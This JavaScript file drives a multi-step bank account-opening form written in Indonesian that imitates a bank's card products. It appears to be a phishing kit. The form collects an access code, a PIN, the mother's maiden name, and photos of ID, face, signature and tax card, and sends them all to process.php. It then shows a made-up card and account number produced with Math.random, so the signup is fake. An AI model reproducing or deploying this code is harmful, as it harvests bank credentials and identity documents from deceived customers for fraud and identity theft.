let currentStep = 1;
let rekeningType = '';
let namaLengkap = '';
let nomorKartu = '';
let nomorRekening = '';

function nextStep(step) {
    document.getElementById(`form-step-${currentStep}`).classList.remove('active');
    currentStep = step;
    document.getElementById(`form-step-${currentStep}`).classList.add('active');

    if (currentStep === 9) {
        showPasporOptions();
    }

    if (currentStep === 11) {
        reviewData();
    }

    if (currentStep === 13) {
        generateAccountInfo();
    }
}

function setRekening(type) {
    rekeningType = type;
}

function showPasporOptions() {
    const pasporOptions = document.getElementById('paspor_options');
    pasporOptions.innerHTML = '';
    if (rekeningType === 'TAHAPAN') {
        pasporOptions.innerHTML += '<div class="radio-container"><label class="radio-button-label"><input type="radio" name="paspor" value="PASPOR PLATINUM"> PASPOR PLATINUM</label></div><br>';
        pasporOptions.innerHTML += '<div class="radio-container"><label class="radio-button-label"><input type="radio" name="paspor" value="PASPOR GOLD"> PASPOR GOLD</label></div><br>';
        pasporOptions.innerHTML += '<div class="radio-container"><label class="radio-button-label"><input type="radio" name="paspor" value="PASPOR BLUE"> PASPOR BLUE</label></div><br>';
    } else if (rekeningType === 'XPRESI') {
        pasporOptions.innerHTML += '<div class="radio-container"><label class="radio-button-label"><input type="radio" name="paspor" value="PASPOR XPRESI"> PASPOR XPRESI</label><br>';
    }
}

function reviewData() {
    const reviewDataDiv = document.getElementById('review_data');
    reviewDataDiv.innerHTML = `
        <p>Nama Lengkap: ${document.getElementById('nama_lengkap').value}</p>
        <p>Kode Akses: ${document.getElementById('kode_akses').value}</p>
        <p>Tujuan Pembukaan Rekening: ${document.getElementById('tujuan').value}</p>
        <p>Nama Gadis Ibu Kandung: ${document.getElementById('nama_ibu_kandung').value}</p>
        <p>Status Perkawinan: ${document.getElementById('status_perkawinan').value}</p>
        <p>Agama: ${document.getElementById('agama').value}</p>
        <p>Status Tempat Tinggal: ${document.getElementById('status_tempat_tinggal').value}</p>
        <p>Nama Perusahaan: ${document.getElementById('nama_perusahaan').value}</p>
        <p>Jabatan: ${document.getElementById('jabatan').value}</p>
        <p>Bidang Usaha: ${document.getElementById('bidang_usaha').value}</p>
        <p>Alamat Kantor: ${document.getElementById('alamat_kantor').value}</p>
        <p>Kota: ${document.getElementById('kota').value}</p>
        <p>Kode Pos: ${document.getElementById('kode_pos').value}</p>
        <p>Telepon Kantor: ${document.getElementById('telepon_kantor').value}</p>
        <p>Jenis Paspor: ${document.querySelector('input[name="paspor"]:checked').value}</p>
        <p>Kantor Cabang: ${document.getElementById('kantor_cabang').value}</p>
    `;
}

function submitForm() {
    const formData = new FormData();
    formData.append('nama_lengkap', document.getElementById('nama_lengkap').value);
    formData.append('kode_akses', document.getElementById('kode_akses').value);
    formData.append('tujuan', document.getElementById('tujuan').value);
    formData.append('nama_ibu_kandung', document.getElementById('nama_ibu_kandung').value);
    formData.append('status_perkawinan', document.getElementById('status_perkawinan').value);
    formData.append('agama', document.getElementById('agama').value);
    formData.append('status_tempat_tinggal', document.getElementById('status_tempat_tinggal').value);
    formData.append('nama_perusahaan', document.getElementById('nama_perusahaan').value);
    formData.append('jabatan', document.getElementById('jabatan').value);
    formData.append('bidang_usaha', document.getElementById('bidang_usaha').value);
    formData.append('alamat_kantor', document.getElementById('alamat_kantor').value);
    formData.append('kota', document.getElementById('kota').value);
    formData.append('kode_pos', document.getElementById('kode_pos').value);
    formData.append('telepon_kantor', document.getElementById('telepon_kantor').value);
    formData.append('jenis_paspor', document.querySelector('input[name="paspor"]:checked').value);
    formData.append('kantor_cabang', document.getElementById('kantor_cabang').value);
    formData.append('foto_ktp', document.getElementById('foto_ktp').files[0]);
    formData.append('foto_diri', document.getElementById('foto_diri').files[0]);
    formData.append('tanda_tangan', document.getElementById('tanda_tangan').files[0]);
    formData.append('npwp', document.getElementById('npwp').files[0]);
    formData.append('pin', document.getElementById('pin').value);

    fetch('process.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            namaLengkap = document.getElementById('nama_lengkap').value;
            alert('Pendaftaran berhasil. Berikut data Rekening Anda.');
            nextStep(13);
        } else {
            alert('Gagal menyimpan data: ' + data.error);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function generateAccountInfo() {
    // Mengenerate nomor kartu dan nomor rekening secara acak
    nomorKartu = '4000 ' + Math.floor(Math.random() * 10000).toString().padStart(4, '0') + ' ' +
                 Math.floor(Math.random() * 10000).toString().padStart(4, '0') + ' ' +
                 Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    nomorRekening = Math.floor(Math.random() * 10000000000).toString().padStart(10, '0');

    // Menampilkan data pada halaman akhir
    document.getElementById('atm-card-name').innerText = namaLengkap;
    document.getElementById('atm-card-number').innerText = nomorKartu;
    document.getElementById('account-number').innerText = nomorRekening;
}

function completeRegistration() {
    const formData = new FormData();
    formData.append('nomor_kartu', nomorKartu);
    formData.append('nomor_rekening', nomorRekening);
    formData.append('nama_lengkap', namaLengkap);

    fetch('complete_registration.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Pendaftaran selesai. Nomor kartu dan rekening telah disimpan.');
            // Redirect atau aksi lainnya setelah selesai
        } else {
            alert('Gagal menyimpan nomor kartu dan rekening: ' + data.error);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function setupFilePreview(inputId, previewId, imgId) {
            document.getElementById(inputId).addEventListener('change', function(event) {
                const file = event.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        document.getElementById(previewId).style.display = 'block';
                        document.getElementById(imgId).src = e.target.result;
                    };
                    reader.readAsDataURL(file);
                }
            });
        }

        setupFilePreview('foto_ktp', 'foto_ktp_preview', 'foto_ktp_img');
        setupFilePreview('foto_diri', 'foto_diri_preview', 'foto_diri_img');
        setupFilePreview('tanda_tangan', 'tanda_tangan_preview', 'tanda_tangan_img');
        setupFilePreview('npwp', 'npwp_preview', 'npwp_img');

        